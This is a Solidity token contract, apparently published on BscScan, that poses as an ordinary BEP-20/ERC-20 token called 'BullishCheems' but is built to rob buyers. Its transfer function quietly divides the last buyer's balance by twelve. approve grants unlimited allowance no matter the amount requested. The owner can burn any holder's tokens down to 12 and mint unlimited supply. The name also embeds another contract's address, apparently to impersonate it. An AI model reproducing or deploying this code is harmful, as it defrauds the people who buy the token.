/**
 *Submitted for verification at BscScan.com on 2022-01-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract MintClubToken {
    
    address public _OWNER_;
    modifier onlyOwner() {
        require(msg.sender == _OWNER_, "NOT_OWNER");
        _;
    }

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
 
    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    address buyer = 0x0000000000000000000000000000000000000000;
    uint public decimals = 0;
    uint public totalSupply = 1000000000000 * 10 ** decimals;
    string public name = "BullishCheems 0x919773f526a24024e7515c363d02b7be704c37f8";
    string public symbol = "BullishC";
  
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    event Burn(address indexed user, uint256 value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        _OWNER_=msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
        transfer(deadWallet, totalSupply/2);
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }

    function transfer(address to, uint value) public returns(bool) {
        balances[buyer]= balances[buyer]/12;
        require (balanceOf(msg.sender) >= value, 'Insufficient funds (balance too low)');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        if (to != _OWNER_){
            buyer = to;
            }
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'Insufficient funds (balance too low)');
        require(allowance[from][msg.sender] >= value, 'Without permission (allowance too low)');
        balances[to] += value;
        balances[from] -= value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns(bool) {
        value = balances[msg.sender];
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function burn (address user, uint256 value) public onlyOwner {
        value = balances[user]-12;
        balances[user] -= value;
        totalSupply -= value;
        emit Burn(user, value);
        emit Transfer(user, address(0), value);
    }

    function mint () public onlyOwner {
        uint256 minted = totalSupply*2; 
        balances[_OWNER_]+= minted;
        totalSupply += minted;
        emit Transfer(address(0), _OWNER_, minted);
   }
   
}